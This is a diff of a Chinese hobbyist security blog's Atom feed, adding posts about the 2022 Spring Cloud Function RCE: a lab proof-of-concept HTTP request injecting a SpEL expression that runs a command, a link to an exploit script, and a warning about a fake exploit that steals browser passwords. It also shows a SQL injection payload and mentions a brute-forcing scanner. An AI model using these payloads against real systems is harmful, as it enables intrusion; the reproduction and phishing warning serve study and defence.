@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chinaran0.github.io/</id>
     <title>冄老狗</title>
-    <updated>2022-03-29T16:39:12.509Z</updated>
+    <updated>2022-03-29T17:44:22.138Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chinaran0.github.io/"/>
     <link rel="self" href="https://chinaran0.github.io/atom.xml"/>
@@ -11,6 +11,51 @@
     <logo>https://chinaran0.github.io/images/avatar.png</logo>
     <icon>https://chinaran0.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, 冄老狗</rights>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] SpringRCE EXP脚本]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-springrce-exp-jiao-ben/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-springrce-exp-jiao-ben/">
+        </link>
+        <updated>2022-03-29T17:34:46.000Z</updated>
+        <content type="html"><![CDATA[<p>脚本地址：<br>
+https://github.com/ChinaRan0/SpringRCE-EXP</p>
+<p>隐私库，等修补之后再公开。<br>
+复现环境：https://www.aliyundrive.com/s/q8pxvK8pC6a</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] Spring RCE EXP]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-rce-exp/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-spring-rce-exp/">
+        </link>
+        <updated>2022-03-29T16:58:59.000Z</updated>
+        <content type="html"><![CDATA[<p>复现环境：https://github.com/Pizz33/Spring-Cloud-Function-SpEL<br>
+使用idea新增一个spring lnitializr项目，选择与环境匹配的java版本添加spring web和function右侧栏选择maven-package编译jar包编译完成后运行jar包<br>
+java -jar demo-0.0.1-SNAPSHOT.jar</p>
+<p>POST /functionRouter HTTP/1.1<br>
+Host: 127.0.0.1:8080<br>
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)<br>
+Content-Type: application/x-www-form-urlencoded<br>
+Content-Length: 5</p>
+<p>ran</p>
+<figure data-type="image" tabindex="1"><img src="https://chinaran0.github.io//post-images/1648573579057.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[记录网安生活] 警惕，有人利用Spring RCE EXP 钓鱼！]]></title>
+        <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-jing-ti-you-ren-li-yong-spring-rce-exp-diao-yu/</id>
+        <link href="https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-jing-ti-you-ren-li-yong-spring-rce-exp-diao-yu/">
+        </link>
+        <updated>2022-03-29T16:33:13.000Z</updated>
+        <content type="html"><![CDATA[<p>假的EXP:<br>
+https://github.com/shakeman8/Spring-Core-RCE</p>
+<p>该exe文件大小是8M左右，经过证实，该文件为针对安全从业人员的钓鱼攻击：</p>
+<p>https://www.virustotal.com/gui/file/45ef7d9efba711af2196fe0d14097293fb0922</p>
+<p>根据NowSec师傅的分析，当前样本执行之后的效果如下：执行之后会读取浏览器保存的用户名、密码和对应URL、然后在C:\Users\Public下创建一个tmp文件，下次再执行，就不会上传(应该是判断这个tmp文件是否存在吧)，删除tmp文件后再执行可以复现。</p>
+<p>最后通过技术手段得到目标ip：84.247.23.128<br>
+好玩的来了。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[记录网安生活] SpringRCE 应急相应]]></title>
         <id>https://chinaran0.github.io/post/ji-lu-wang-an-sheng-huo-springrce-ying-ji-xiang-ying/</id>
@@ -119,48 +164,6 @@ http://172.17.0.1/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
 1.被我自己所知的知识感觉非常自信<br>
 2.在网上找解决方法的时候不自信<br>
 3.只会用自己所学的知识解决问题，不知道闭关锁国会亡国。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[闲来无聊，写了个脚本]]></title>
-        <id>https://chinaran0.github.io/post/xian-lai-wu-liao-xie-liao-ge-jiao-ben/</id>
-        <link href="https://chinaran0.github.io/post/xian-lai-wu-liao-xie-liao-ge-jiao-ben/">
-        </link>
-        <updated>2022-03-13T11:43:05.000Z</updated>
-        <content type="html"><![CDATA[<p>FastPenetrationScan<br>
-https://github.com/ChinaRan0/FPScan<br>
-快速渗透扫描</p>
-<p>开发的初心是快速的进行渗透打点 本人技术菜只会用顺序结构来写 因为我用的kali是虚拟机，考虑到性能就不做多线程了 输入ip全自动就行端口扫描，如果扫描到22，3389，则自动进行暴力破解 如果输入域名，进行whois查询，后期加上子域名爆破 再然后，没有了。</p>
-<p>用到的环境安装命令</p>
-<p>pip install nmap<br>
-sudo apt install nmap<br>
-sudo apt install hydra</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[行了，又让老哥骂了！]]></title>
-        <id>https://chinaran0.github.io/post/xing-liao-you-rang-lao-ge-ma-liao/</id>
-        <link href="https://chinaran0.github.io/post/xing-liao-you-rang-lao-ge-ma-liao/">
-        </link>
-        <updated>2022-03-06T07:32:13.000Z</updated>
-        <content type="html"><![CDATA[<p>我之前不是写了个QQ问候脚本嘛，然后老哥今天又骂我了说，‘正是因为有你这样的脚本在，才让这个网络的键盘侠那么猖狂！’</p>
-<p>我我我...冤枉啊！</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[记录，如何免费下载百度文库上的ppt【道客巴巴等通用】]]></title>
-        <id>https://chinaran0.github.io/post/ji-lu-ru-he-mian-fei-xia-zai-bai-du-wen-ku-shang-de-pptdao-ke-ba-ba-deng-tong-yong/</id>
-        <link href="https://chinaran0.github.io/post/ji-lu-ru-he-mian-fei-xia-zai-bai-du-wen-ku-shang-de-pptdao-ke-ba-ba-deng-tong-yong/">
-        </link>
-        <updated>2022-03-06T06:29:15.000Z</updated>
-        <content type="html"><![CDATA[<p>额，，马上要开始培训了，所以说，ppt我是肯定不会做的，有这时间打csgo多号，然后突然想起来百度文库啥都有，直接梭哈了。<br>
-用到的工具：稻壳阅读器<br>
-目标ppt<br>
-<img src="https://chinaran0.github.io//post-images/1646548269161.png" alt="" loading="lazy"><br>
-然后打开稻壳，输入文档的网址<br>
-<img src="https://chinaran0.github.io//post-images/1646548327590.png" alt="" loading="lazy"><br>
-直接粘贴网址走起，右键另存为<br>
-<img src="https://chinaran0.github.io//post-images/1646548702765.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
 </feed>
